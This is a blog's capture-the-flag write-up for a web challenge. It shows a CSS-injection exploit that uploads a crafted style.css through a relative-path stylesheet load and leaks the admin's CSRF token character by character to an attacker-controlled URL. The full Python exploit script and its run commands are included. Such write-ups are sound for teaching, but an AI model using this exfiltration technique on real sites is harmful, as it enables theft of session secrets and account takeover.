<!DOCTYPE html>
<html lang="en">
<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=8664&amp;path=livereload" data-no-instant defer></script>
  
    <title> :: </title>
  
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="In the Cloud Hard: 700 pts A platform that would serve as a cloud for attackers has been discovered. An important file is auto-copied into each user&rsquo;s directory when creating their account, however it can only be read by the admin. Find a way to do this.
Challmaker: sc0r7
Recognition phase We have on this app we can create an account log into it and post our files which would be available to download for only 5 minutes.
" />
<meta name="keywords" content="" />

  <meta name="robots" content="noodp" />

<link rel="canonical" href="//localhost:8664/writeups/in_the_cloud/" />







  
  
  
  
  
  <link rel="stylesheet" href="//localhost:8664/styles.css">







  <link rel="shortcut icon" href="//localhost:8664/img/theme-colors/blue.png">
  <link rel="apple-touch-icon" href="//localhost:8664/img/theme-colors/blue.png">



<meta name="twitter:card" content="summary" />

  
    <meta name="twitter:site" content="" />
  
    <meta name="twitter:creator" content="" />



<meta property="og:locale" content="en" />
<meta property="og:type" content="website" />
<meta property="og:title" content="">
<meta property="og:description" content="In the Cloud Hard: 700 pts A platform that would serve as a cloud for attackers has been discovered. An important file is auto-copied into each user&rsquo;s directory when creating their account, however it can only be read by the admin. Find a way to do this.
Challmaker: sc0r7
Recognition phase We have on this app we can create an account log into it and post our files which would be available to download for only 5 minutes.
" />
<meta property="og:url" content="//localhost:8664/writeups/in_the_cloud/" />
<meta property="og:site_name" content="" />

  
    <meta property="og:image" content="//localhost:8664/img/favicon/blue.png">
  

<meta property="og:image:width" content="1200">
<meta property="og:image:height" content="627">





  <link href="/writeups/in_the_cloud/index.xml" rel="alternate" type="application/rss+xml" title="" />










  


</head>
<body class="blue">




<div class="container center headings--one-size">

  <header class="header">
  <div class="header__inner">
    <div class="header__logo">
      <a href="/">
  <div class="logo">
    0z stuff&#39;s
  </div>
</a>

    </div>
    
      <ul class="menu menu--mobile">
  <li class="menu__trigger">Menu&nbsp;▾</li>
  <li>
    <ul class="menu__dropdown">
      
        
          <li><a href="/about">About</a></li>
        
      
        
          <li><a href="/projects">Projects</a></li>
        
      
        
          <li><a href="/writeups">Writeups</a></li>
        
      
      
    </ul>
  </li>
</ul>

    
    
  </div>
  
    <nav class="navigation-menu">
  <ul class="navigation-menu__inner menu--desktop">
    
      
      
        
          <li><a href="/about" >About</a></li>
        
      
        
          <li><a href="/projects" >Projects</a></li>
        
      
        
          <li><a href="/writeups" >Writeups</a></li>
        
      
      
    
  </ul>
</nav>

  
</header>


  <div class="content">
    
  
    <div class="index-content">
      <h1 id="in-the-cloud"><strong><em>In the Cloud</em></strong></h1>
<h3 id="hard-700-pts">Hard: 700 pts</h3>
<blockquote>
<p>A platform that would serve as a cloud for attackers has been discovered. An important file is auto-copied into each user&rsquo;s directory when creating their account, however it can only be read by the admin. Find a way to do this.</p>
</blockquote>
<blockquote>
<p>Challmaker: sc0r7</p>
</blockquote>
<h3 id="recognition-phase">Recognition phase</h3>
<p><img src="base_page.png" alt="base page"></p>
<p>We have on this app we can create an account log into it and post our files which would be available to download for only 5 minutes.</p>
<p>Every uploaded file is located at <code>users/&lt;username&gt;/&lt;filaname&gt;</code> and trying to access it via url we get a 403.</p>
<p><img src="403_page.png" alt="403"></p>
<p>We also see that every user have a default file <code>users/&lt;username&gt;/flag</code> and it is what we&rsquo;re looking for.
Trying to download it we get a message this message</p>
<p><strong>Only admin csrf token can read the flag.</strong></p>
<p>This tells us that we gotta find a way to look for the admin CSRF token as it is the only one that is authorized to download this file.</p>
<p>We also have <code>bounty.php</code> page where we can provide an admin a link to look for.</p>
<h3 id="exploit-phase">Exploit phase</h3>
<p>So at first I tried every possible way to upload a php to the server but I always got the same message</p>
<p><img src="php_not_allowed.png" alt="php unauthrized"></p>
<p>I then looked for an XSS and didn&rsquo;t find anything profitable but something rather funny</p>
<p><img src="xss.png" alt="weird xss"></p>
<p>But this won&rsquo;t help much or at least I didn&rsquo;t dig much onto that. Skipping all the other tricks tried I will head right to the real solve.</p>
<p>By taking a closer look at the error pages (403, 404&hellip;) we can see that a CSS file is referenced using a relative path.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>    &lt;<span style="color:#f92672">link</span> <span style="color:#a6e22e">rel</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;stylesheet&#34;</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;style.css&#34;</span>&gt;
</span></span></code></pre></div><p>What I mean by relative path is that whenever a page triggers one of these errors the app will try to load the CSS from the given page that triggered that error. And we can confirm this by taking a look at the inspector.</p>
<p><img src="loading_style.png" alt="loading style"></p>
<p>Knowing that we can then assume that by trying to access <code>/users/&lt;username&gt;</code> which normally throws a 403 if the folder contain one of our file named style.css it will be relatively loaded at <code>/users/&lt;username&gt;/style.css</code> and this opens up a way for CSS injection. We could then use a <strong><em>CSS Data Exfiltration</em></strong>.</p>
<p>This is a very interesting exploit as it shows how little flaws in security are exploitable. (<em>Must be crazy to find this exploit lol</em>)</p>
<p>So here is a beautiful blog that explains it: <a href="https://aszx87410.github.io/beyond-xss/en/ch3/css-injection/">CSS Injection</a></p>
<p>I then built an exploit script to:</p>
<ul>
<li>Create a file named style.css in my user directory</li>
<li>Send the link of my user directory to the admin</li>
</ul>



  <div class="collapsable-code">
    <input id="1" type="checkbox"  />
    <label for="1">
      <span class="collapsable-code__language">python</span>
      <span class="collapsable-code__title">Python Script</span>
      <span class="collapsable-code__toggle" data-label-expand="Show" data-label-collapse="Hide"></span>
    </label>
    <pre class="language-python" ><code>
import http.client
import os
import uuid
import sys
import requests

boundary = str(uuid.uuid4())
headers = {
    &#39;Content-Type&#39;: f&#34;multipart/form-data; boundary={boundary}&#34;,
    &#39;Cookie&#39;: &#34;session=REDACTED; PHPSESSID=REDACTED&#34;
}

conn = http.client.HTTPConnection(&#34;ctf.hackerlab.bj&#34;, 2020)

key = sys.argv[1]

if len(key) == 64:
    print(&#34;Token fully retrieved&#34;)

data = f&#34;&#34;&#34;
  input[name=&#34;csrf&#34;][value^=&#34;{key}a&#34;] {{
    background: url(https://REDACTED/?q=a)
  }}

  input[name=&#34;csrf&#34;][value^=&#34;{key}b&#34;] {{
    background: url(https://REDACTED/?q=b)
  }}

  input[name=&#34;csrf&#34;][value^=&#34;{key}c&#34;] {{
    background: url(https://REDACTED/?q=c)
  }}

  input[name=&#34;csrf&#34;][value^=&#34;{key}d&#34;] {{
    background: url(https://REDACTED/?q=d)
  }}

  input[name=&#34;csrf&#34;][value^=&#34;{key}e&#34;] {{
    background: url(https://REDACTED/?q=e)
  }}

  input[name=&#34;csrf&#34;][value^=&#34;{key}f&#34;] {{
    background: url(https://REDACTED/?q=f)
  }}

  input[name=&#34;csrf&#34;][value^=&#34;{key}0&#34;] {{
    background: url(https://REDACTED/?q=0)
  }}

  input[name=&#34;csrf&#34;][value^=&#34;{key}1&#34;] {{
    background: url(https://REDACTED/?q=1)
  }}

  input[name=&#34;csrf&#34;][value^=&#34;{key}2&#34;] {{
    background: url(https://REDACTED/?q=2)
  }}

  input[name=&#34;csrf&#34;][value^=&#34;{key}3&#34;] {{
    background: url(https://REDACTED/?q=3)
  }}

  input[name=&#34;csrf&#34;][value^=&#34;{key}4&#34;] {{
    background: url(https://REDACTED/?q=4)
  }}

  input[name=&#34;csrf&#34;][value^=&#34;{key}5&#34;] {{
    background: url(https://REDACTED/?q=5)
  }}

  input[name=&#34;csrf&#34;][value^=&#34;{key}6&#34;] {{
    background: url(https://REDACTED/?q=6)
  }}

  input[name=&#34;csrf&#34;][value^=&#34;{key}7&#34;] {{
    background: url(https://REDACTED/?q=7)
  }}

  input[name=&#34;csrf&#34;][value^=&#34;{key}8&#34;] {{
    background: url(https://REDACTED/?q=8)
  }}

  input[name=&#34;csrf&#34;][value^=&#34;{key}9&#34;] {{
    background: url(https://REDACTED/?q=9)
  }}
  &#34;&#34;&#34;


payload = (
    f&#34;--{boundary}\r\n&#34;
    f&#34;Content-Disposition: form-data; name=\&#34;files[]\&#34;; filename=\&#34;style.css\&#34;\r\n&#34;
    &#34;Content-Type: text/css\r\n&#34;
    &#34;\r\n&#34;
    f&#34;{data}\r\n&#34;
    f&#34;--{boundary}\r\n&#34;
    f&#34;Content-Disposition: form-data; name=\&#34;csrf\&#34;\r\n&#34;
    f&#34;\r\n&#34;
    f&#34;REDACTED\r\n&#34;
    f&#34;--{boundary}--\r\n&#34;
)

conn.request(&#34;POST&#34;, &#34;/cloud.php&#34;, body=payload, headers=headers)

response = conn.getresponse()
data = response.read()

conn.close()

res = requests.post(&#39;http://ctf.hackerlab.bj:2020/bounty.php&#39;, headers={
        &#34;Cookie&#34;: &#34;session=REDACTED; PHPSESSID=REDACTED&#34;
    }, data={
        &#34;url&#34;:&#34;/users/giga/&#34;,
        &#34;csrf&#34;:&#34;REDACTED&#34;
    })

</code></pre>
  </div>


<p>To use this script you have to run it with at first with an empty string check which char is reflected on your serv, add it to your <em>known token part</em> and then re-run it again.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>➜  cloud python3 test.py <span style="color:#e6db74">&#34;&#34;</span>
</span></span><span style="display:flex;"><span>➜  cloud python3 test.py <span style="color:#e6db74">&#34;0&#34;</span>
</span></span><span style="display:flex;"><span>➜  cloud python3 test.py <span style="color:#e6db74">&#34;0f&#34;</span>
</span></span><span style="display:flex;"><span>➜  cloud python3 test.py <span style="color:#e6db74">&#34;0f&#34;</span>
</span></span><span style="display:flex;"><span>➜  cloud python3 test.py <span style="color:#e6db74">&#34;0f4&#34;</span>
</span></span><span style="display:flex;"><span>➜  cloud python3 test.py <span style="color:#e6db74">&#34;0f47&#34;</span>
</span></span><span style="display:flex;"><span>➜  cloud python3 test.py <span style="color:#e6db74">&#34;0f47&#34;</span>
</span></span><span style="display:flex;"><span>➜  cloud python3 test.py <span style="color:#e6db74">&#34;0f478&#34;</span>
</span></span><span style="display:flex;"><span>...
</span></span></code></pre></div><p>Sometimes it doesn&rsquo;t automatically works so I had to run it some more time to get the next char.</p>
<p><img src="exploit_page.png" alt="exploit phase"></p>
<p>After a bunch of time running the exploit we finally get the token. By accessing
<code>/cloud.php?csrf=&lt;TOKEN&gt;&amp;filename=flag</code> we get the flag</p>
<p><img src="flag_found.png" alt="flag found"></p>
<h5 id="by-w1z0z---l3gm1nn"><em>By w1z0z - (l3gm1nn)</em></h5>

    </div>
  
  <div class="posts">
    

    <div class="pagination">
  <div class="pagination__buttons">
    
    
  </div>
</div>

  </div>

  </div>

  
    <footer class="footer">
  <div class="footer__inner">
    
      <div class="copyright">
        <span>© 2025 Powered by <a href="https://gohugo.io">Hugo</a></span>
    
      </div>
  </div>
</footer>






<script type="text/javascript" src="/bundle.min.js"></script>








  
</div>

</body>
</html>
